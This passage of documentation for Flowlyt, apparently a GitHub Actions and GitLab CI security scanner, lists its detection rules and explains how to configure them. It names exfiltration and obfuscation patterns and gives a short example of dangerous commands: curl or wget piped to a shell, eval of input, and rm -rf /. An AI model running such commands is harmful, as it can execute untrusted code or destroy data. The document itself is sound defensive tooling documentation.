| `KNOWN_VULNERABLE_ACTION` | CRITICAL | Detects usage of GitHub Actions with known security vulnerabilities |
| `WORKFLOW_RUN_ARTIFACT_UNTRUSTED` | CRITICAL | workflow_run downloads artifacts without constraining run_id, enabling supply chain attacks (CVE-2025-30066 pattern) |
| `WORKFLOW_RUN_ENV_INJECTION` † | CRITICAL | A workflow_run job downloads an artifact and then writes to $GITHUB_ENV or $GITHUB_PATH. If the artifact content is attacker-controlled, this enables environment variable injection into subsequent steps. |
| `ARTIFACT_POISONING` | HIGH | Detects potentially malicious artifact upload/download patterns |
| `REF_CONFUSION` | HIGH | Detects potential git reference confusion vulnerabilities |
| `REF_VERSION_MISMATCH` 🌐 | HIGH | SHA-pinned action does not point at the version claimed by its adjacent comment |
| `REPO_JACKING_VULNERABILITY` 🌐 | HIGH | Verifies external actions point to valid GitHub users/organizations |
| `TYPOSQUATTING_ACTION` | HIGH | Detects action names that might be typosquatting attempts |
| `WORKFLOW_RUN_ELEVATED_CONTEXT` † | HIGH | A workflow_run job downloads artifacts while running with write permissions. If artifact content is attacker-controlled, the elevated context enables privilege escalation (e.g., code push, release creation). |
| `ARCHIVED_ACTION_SOURCE` 🌐 | MEDIUM | Workflow depends on an action whose repository is archived and therefore can no longer receive security fixes |
| `ARTIPACKED_VULNERABILITY` | MEDIUM | Detects vulnerabilities in artifact creation and packaging processes |
| `CACHE_RESTORE_KEYS_TOO_BROAD` | MEDIUM | Broad restore-keys without content hash enables cache poisoning from PR branches |
| `DEPRECATED_ACTION` | MEDIUM | Detects usage of deprecated action versions |
| `INSECURE_URL_SCHEME` | MEDIUM | Workflow retrieves a resource over plaintext HTTP, allowing a network attacker to tamper with the response |
| `MISSING_DEPENDENCY_REVIEW` † | MEDIUM | Pull request workflow lacks dependency review which can detect malicious dependencies |
| `MISSING_HARDEN_RUNNER` † | MEDIUM | Workflow lacks step-security/harden-runner which provides runtime security for GitHub Actions |
| `STALE_ACTION_REFS` 🌐 | MEDIUM | Detects actions referenced by outdated or non-existent versions |
| `UNPINNABLE_ACTION` | MEDIUM | Detects actions that cannot be pinned to specific versions |
| `UNPINNED_CONTAINER_IMAGE` | MEDIUM | Container image is not pinned to an immutable digest, allowing upstream content to change silently |
| `UNPINNED_TOOL_INSTALL` | MEDIUM | Workflow installs a tool without a version constraint, so a newly published release executes automatically |
| `UNTRUSTED_ACTION_SOURCE` | MEDIUM | Detects actions from untrusted or unknown publishers |
| `USE_TRUSTED_PUBLISHING` | MEDIUM | Detects PyPI publishing without trusted publishing (OIDC) |
| `ADHOC_PACKAGE_INSTALL` | LOW | Dependencies are installed ad hoc instead of from a committed lockfile, leaving the resolved versions unpinned |
| `CACHE_WRITE_IN_PR_WORKFLOW` | LOW | Writing to the cache from a pull_request workflow can allow untrusted code to poison the cache for future runs |
| `ADVANCED_TYPOSQUATTING` † | severity |  |
| `ADVANCED_VULNERABLE_ACTION` 🌐 † | severity |  |
| `VERSION_PINNING_ANALYSIS` † | severity |  |

#### Access Control

| Rule ID | Severity | Detects |
|---------|----------|---------|
| `PULL_REQUEST_TARGET_CHECKOUT_RISK` † | CRITICAL | pull_request_target workflow checks out untrusted code from pull request head |
| `SELF_HOSTED_RUNNER_PR_EXPOSURE` † | CRITICAL | Self-hosted runners are exposed to pull requests in a public repository, allowing potential code execution from forks |
| `SELF_HOSTED_RUNNER_SECURITY` | CRITICAL | Detects security risks with self-hosted runners, especially in pull request workflows |
| `SELF_HOSTED_RUNNER_WRITE_ALL` † | CRITICAL | Self-hosted runner has write-all permissions, creating excessive privilege risk |
| `SELF_HOSTED_RUNNER_ADMIN_PRIVILEGES` † | HIGH | Self-hosted runner step uses administrative privileges, increasing security risk |
| `SELF_HOSTED_RUNNER_ISSUE_EXPOSURE` † | HIGH | Self-hosted runners can be triggered by issue events in a public repository, allowing potential abuse |
| `UNTRUSTED_TRIGGER` | HIGH | Detects workflows that can be externally triggered with potential security risks |
| `BOT_IDENTITY_CHECK` | MEDIUM | Detects if statements based on bot identity that could be exploited |
| `CROSS_REPOSITORY_ACCESS` † | MEDIUM | Workflow accesses a different repository, which may have security implications |
| `CROSS_REPOSITORY_ACCESS_COMMAND` † | MEDIUM | Command accesses external repositories, which may have security implications |
| `ENVIRONMENT_BYPASS_RISK` † | MEDIUM | Pull request triggered workflow may bypass environment protections through workflow dispatch |
| `EXCESSIVE_WRITE_PERMISSIONS` † | MEDIUM | Workflow appears to be read-only but has write permissions |
| `PUBLIC_REPO_SELF_HOSTED_ENVIRONMENT` † | MEDIUM | Self-hosted runner in public repository has environment access, creating potential privilege escalation risk |
| `DEBUG_OIDC_ACTIONS` | INFO | Detects workflows that use OIDC token authentication |
| `UNDOCUMENTED_PERMISSIONS` | INFO | A write permission is granted without an explanatory comment, making it hard to tell whether it is still required |

#### Privilege Escalation

| Rule ID | Severity | Detects |
|---------|----------|---------|
| `OIDC_WORKFLOW_LEVEL_PERMISSION` | HIGH | id-token: write at workflow level exposes all jobs to OIDC token access, enabling privilege escalation via expression injection |
| `TOKEN_PERMISSION_ESCALATION` † | HIGH | Step contains patterns that could be used to escalate token permissions or extract token data |
| `GITHUB_APP_TOKEN_MISUSE` | MEDIUM | GitHub App installation token is requested with broader scope or lifetime than the job requires |
| `OIDC_WITHOUT_ENVIRONMENT_SCOPE` † | MEDIUM | Job has id-token: write permission but no environment: set, allowing OIDC tokens to be issued without deployment protection rules |

#### Malicious Patterns

| Rule ID | Severity | Detects |
|---------|----------|---------|
| `MALICIOUS_DATA_EXFILTRATION` | CRITICAL | Detects potential exfiltration of secrets or sensitive data to external servers |
| `DANGEROUS_COMMAND` † | HIGH | Command contains potentially dangerous or destructive operations |
| `DNS_EXFILTRATION` | HIGH | Command encodes data into a DNS query, exfiltrating it over a channel that egress filtering rarely inspects |
| `MALICIOUS_CURL_PIPE_BASH` | HIGH | Detects curl or wget piped to bash/sh/zsh, which can execute malicious code |
| `COVERT_CHANNEL_EXFILTRATION` | MEDIUM | Command leaks data through a side channel such as ICMP payloads, job timing, or transfer volume |
| `SHELL_SCRIPT_ISSUES` | MEDIUM | Detects common shell script security issues in run commands using basic shellcheck-like analysis |
| `STEGANOGRAPHIC_EXFILTRATION` | MEDIUM | Command hides data inside another file or its metadata, so the payload survives artifact upload and review |

#### Shell Obfuscation

| Rule ID | Severity | Detects |
|---------|----------|---------|
| `MALICIOUS_BASE64_DECODE` | CRITICAL | Detects execution of base64-decoded data, which can hide malicious code |
| `SHELL_OBFUSCATION` † | CRITICAL | Shell command appears to use obfuscation techniques to hide its true purpose |
| `OBFUSCATION_DETECTION` | HIGH | Detects obfuscated code patterns that may hide malicious behavior |
| `SHELL_EVAL_USAGE` † | HIGH | Use of eval in shell scripts can be dangerous as it executes dynamic code |

#### Data Exposure

| Rule ID | Severity | Detects |
|---------|----------|---------|
| `DEBUG_ARTIFACTS_UPLOAD` | INFO | Detects workflows that upload artifacts for debugging purposes |
| `AST_SENSITIVE_DATA_FLOW` † | CRITICAL/HIGH/MEDIUM | A secret or other sensitive value flows to a network, log, or untrusted sink |

#### Misconfiguration

| Rule ID | Severity | Detects |
|---------|----------|---------|
| `BROAD_PERMISSIONS` | CRITICAL | Workflow uses overly broad permissions that grant unnecessary access |
| `INSECURE_PULL_REQUEST_TARGET` | CRITICAL | Detects insecure usage of pull_request_target event with code checkout |
| `SELF_HOSTED_RUNNER_NETWORK_RISK` † | HIGH | Self-hosted runner performs risky network operations that could compromise the runner environment |
| `UNSECURE_COMMANDS_ENABLED` | HIGH | Detects workflows with ACTIONS_ALLOW_UNSECURE_COMMANDS enabled, which is deprecated and dangerous |
| `CONTINUE_ON_ERROR_CRITICAL_JOB` | MEDIUM | Detects critical jobs with continue-on-error set to true |
| `LOCAL_ACTION_USAGE` | MEDIUM | Detects usage of local actions which may pose security risks |
| `RUNNER_LABEL_CONFUSION` † | MEDIUM | Runner labels may be confusing and could lead to jobs running on unintended infrastructure:  |
| `RUNNER_LABEL_VALIDATION` | MEDIUM | Validates GitHub-hosted and self-hosted runner labels in runs-on configuration |
| `UNPINNED_ACTION` | MEDIUM | Detects usage of GitHub Actions without pinned versions (uses latest or branch) |
| `CONCURRENCY_LIMITS_MISSING` | LOW | Workflow allows redundant concurrent runs, enabling runner resource exhaustion and artifact race conditions |
| `MISFEATURE` | LOW | Workflow enables a permitted but hazardous platform feature that widens the impact of a compromise |
| `ANONYMOUS_DEFINITION` | INFO | Workflow omits a top-level name, so it is identified only by filename in the Actions UI |

#### Policy Violation

| Rule ID | Severity | Detects |
|---------|----------|---------|
| `FORBIDDEN_USES` † | HIGH | Action usage violates the configured `uses:` policy |

#### GitLab CI/CD Rules

| Rule ID | Severity | Detects |
|---------|----------|---------|
| `GITLAB_SCRIPT_INJECTION` | CRITICAL | User input directly used in script commands without sanitization |
| `GITLAB_EXPOSED_VARIABLES` | HIGH | Potentially sensitive variables exposed in pipeline configuration |
| `GITLAB_INSECURE_IMAGE` | HIGH | Using latest tag or unverified Docker images |
| `GITLAB_PRIVILEGED_SERVICES` | HIGH | Using privileged Docker services which can be dangerous |
| `GITLAB_INSECURE_ARTIFACTS` | MEDIUM | Artifacts configured without proper expiration or access controls |
| `GITLAB_UNRESTRICTED_RULES` | MEDIUM | Pipeline runs without proper branch or tag restrictions |

#### Dependabot Configuration Rules

| Rule ID | Severity | Detects |
|---------|----------|---------|
| `DEPENDABOT_INSECURE_EXECUTION` | HIGH | Dependabot is permitted to execute external dependency code during resolution, exposing its credentials to that code |
| `DEPENDABOT_COOLDOWN_MISSING` | MEDIUM | Dependency updates are adopted without a cooldown period, increasing exposure to freshly published malicious releases |

## Rule Configuration

### Enabling/Disabling Rules

#### Via Command Line
```bash
# Enable only specific rules
flowlyt --enable-rules HARDCODED_SECRET,MALICIOUS_BASE64_DECODE --repo .

# Disable specific rules
flowlyt --disable-rules UNPINNED_ACTION,CONTINUE_ON_ERROR_CRITICAL_JOB --repo .

# Disable all default rules and enable specific ones
flowlyt --no-default-rules --enable-rules HARDCODED_SECRET --repo .
```

#### Via Configuration File
```yaml
# .flowlyt.yml
rules:
  # Enable only these rules
  enabled:
    - "HARDCODED_SECRET"
    - "MALICIOUS_BASE64_DECODE"
    - "INSECURE_PULL_REQUEST_TARGET"
  
  # Disable these rules
  disabled:
    - "UNPINNED_ACTION"        # Using Dependabot
    - "CONTINUE_ON_ERROR_CRITICAL_JOB"  # Needed for some workflows
```

### Severity Filtering

```bash
# Show only critical and high severity issues
flowlyt --min-severity HIGH --repo .

# Show only critical issues
flowlyt --min-severity CRITICAL --repo .

# Show all issues (default)
flowlyt --min-severity LOW --repo .
```

## Advanced Rule Features

### Context-Aware Analysis

Flowlyt performs context-aware analysis to reduce false positives:

```yaml
# This is NOT flagged as HARDCODED_SECRET because it's in comments
# API_KEY=sk-1234567890  # Example key - replace with real value

# This IS flagged because it's in active code
env:
  API_KEY: sk-1234567890  # ❌ CRITICAL
```

### Multi-Pattern Detection

Rules can use multiple patterns for comprehensive detection:

```yaml
# DANGEROUS_COMMAND rule detects all of these:
run: |
  curl | bash              # Pattern 1
  wget | sh               # Pattern 2
  eval "$input"           # Pattern 3
  rm -rf /               # Pattern 4
```

### File Path Analysis

Rules consider file paths and contexts:

```yaml
# Different treatment based on file location
test/                    # More lenient rules
.github/workflows/       # Full security analysis
scripts/                 # Script-specific rules
```

## Custom Security Rules

You can extend the built-in rules with custom ones:

```yaml
# .flowlyt.yml
rules:
  custom_rules:
    - id: "COMPANY_DOCKER_POLICY"
      name: "Company Docker Image Policy"
      description: "Ensures only approved Docker images are used"
      severity: "HIGH"
      category: "POLICY_VIOLATION"
      type: "regex"
      pattern: "image:\\s*(?!company-registry\\.com/)"
      target:
        commands: true
      remediation: "Use only company-approved Docker images from company-registry.com"
    
    - id: "PROHIBITED_TOOLS"
      name: "Prohibited Security Tools"
      description: "Detects usage of prohibited security scanning tools"
      severity: "MEDIUM"
      type: "regex"
      patterns:
        - "nmap\\s+"
        - "sqlmap\\s+"
        - "metasploit"
      target:
        commands: true
      remediation: "Use company-approved security tools only"
```

## Rule Categories

Every finding carries a `Category`, surfaced in JSON and SARIF output. These are
the only values the engine emits, with the number of rules in each (counts match
the corresponding sections of the catalogue above):

| Category | Rules | Description | Example |
|----------|------:|-------------|---------|
| `SUPPLY_CHAIN` | 28 | Third-party actions, images, packages, and pinning | `UNPINNED_ACTION`, `REF_VERSION_MISMATCH` |
| `INJECTION_ATTACK` | 20 | Untrusted input reaching an execution sink | `SHELL_INJECTION`, `HEREDOC_INJECTION` |
| `ACCESS_CONTROL` | 15 | Permissions, triggers, and runner exposure | `BROAD_PERMISSIONS`, `SELF_HOSTED_RUNNER_PR_EXPOSURE` |
| `SECRET_EXPOSURE` | 14 | Secret and credential handling | `HARDCODED_SECRET`, `SECRETS_OUTSIDE_ENV` |
| `MISCONFIGURATION` | 12 | Hazardous or missing settings | `CONCURRENCY_LIMITS_MISSING`, `MISFEATURE` |
| `MALICIOUS_PATTERN` | 7 | Known-malicious code patterns and covert channels | `MALICIOUS_CURL_PIPE_BASH`, `DNS_EXFILTRATION` |
| `PRIVILEGE_ESCALATION` | 4 | Token and privilege scope | `GITHUB_APP_TOKEN_MISUSE` |
| `SHELL_OBFUSCATION` | 4 | Deliberately obscured shell commands | `SHELL_OBFUSCATION`, `SHELL_EVAL_USAGE` |
| `DATA_EXPOSURE` | 2 | Sensitive data reaching an observable sink | `AST_SENSITIVE_DATA_FLOW` |
| `POLICY_VIOLATION` | 1 | Organizational policy enforcement | `FORBIDDEN_USES` |

The 6 GitLab and 2 Dependabot rules are listed separately in the catalogue and
reuse these same categories.

Categories are safe to filter on exactly: every finding uses one of the values
above, in this spelling.

> **Changed in the latest release.** The engine previously emitted two extra
> values that are now normalised away:
>
> - `SECRETS_EXPOSURE` (plural) — merged into `SECRET_EXPOSURE`. Code matching
>   only the singular form was silently skipping findings that carried the
>   plural one.
> - `injection` (lowercase) — emitted by the advanced injection and
>   exfiltration rules; those rules were rewritten and now use
>   `INJECTION_ATTACK` and `MALICIOUS_PATTERN`.
>
> If you filter findings by category downstream, you can drop any workarounds
> that matched both spellings. In configuration files, `SECRETS_EXPOSURE` is
> still accepted for custom rules and normalises to `SECRET_EXPOSURE`.

### Recently Added Rules

The following rules were added in the latest release. See
[Complete Rule Catalogue](#complete-rule-catalogue) for all rules.

| Rule ID | Severity | Online | Notes |
|---------|----------|:------:|-------|
| `HARDCODED_CONTAINER_CREDENTIALS` | CRITICAL | | Registry password in `container`/`services` |
| `REF_VERSION_MISMATCH` | HIGH | 🌐 | Pinned SHA contradicts its version comment |
| `DEPENDABOT_INSECURE_EXECUTION` | HIGH | | `insecure-external-code-execution: allow` |
| `FORBIDDEN_USES` | HIGH | | Opt-in; requires configuration |
| `GITHUB_APP_TOKEN_MISUSE` | MED/HIGH | | HIGH when owner-wide |
| `UNPINNED_CONTAINER_IMAGE` | MED/LOW | | MEDIUM when untagged or `latest` |
| `ARCHIVED_ACTION_SOURCE` | MEDIUM | 🌐 | Action repo is archived |
| `UNPINNED_TOOL_INSTALL` | MEDIUM | | `go install …@latest` and similar |
| `SECRETS_OUTSIDE_ENV` | MEDIUM | | Secret interpolated into `run:` |
| `INSECURE_URL_SCHEME` | MEDIUM | | Plaintext `http://` |
| `DEPENDABOT_COOLDOWN_MISSING` | MEDIUM | | Missing or short cooldown |
| `MISFEATURE` | LOW/MED | | Submodules, `ssh-key`, `secrets: inherit` |
| `ADHOC_PACKAGE_INSTALL` | LOW | | Install outside a lockfile |
| `CONCURRENCY_LIMITS_MISSING` | LOW | | No `cancel-in-progress` |
| `ANONYMOUS_DEFINITION` | INFO | | Hidden at default min-severity |
| `UNDOCUMENTED_PERMISSIONS` | INFO | | Hidden at default min-severity |

## Performance Optimization

### Rule Execution Order
Rules are executed in optimized order:
1. Fast regex-based rules first
2. Complex parsing rules second  
3. Context-aware analysis last

### Parallel Processing
Multiple workflows are analyzed in parallel for better performance.

### Incremental Analysis
Flowlyt can skip unchanged files when possible:
```bash
# Only analyze changed workflows
flowlyt --incremental --repo .
```

## Integration with IDE/Editors

### VS Code Extension (Planned)
- Real-time rule checking as you type
- Inline suggestions and remediation
- Rule explanation tooltips

### Pre-commit Hooks
```bash
# Install pre-commit hook
cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash
flowlyt --repo . --min-severity HIGH
if [ $? -ne 0 ]; then
  echo "Security issues found. Fix them before committing."
  exit 1
fi
EOF
chmod +x .git/hooks/pre-commit
```

## Rule Development Guidelines

### Creating Effective Rules

1. **Be Specific**: Target specific patterns rather than broad categories
2. **Minimize False Positives**: Use context-aware patterns
3. **Provide Clear Remediation**: Include actionable fix instructions
4. **Test Thoroughly**: Validate against real-world workflows

### Rule Testing
```bash
# Test custom rules against sample workflows
flowlyt --config custom-rules.yml --workflow test/sample-workflow.yml
```

### Contributing Rules
We welcome contributions of new security rules:
1. Follow the rule development guidelines
2. Include test cases and documentation
3. Submit a pull request with your rule

---

**Next:** [Secret Detection](../features/secret-detection.md)
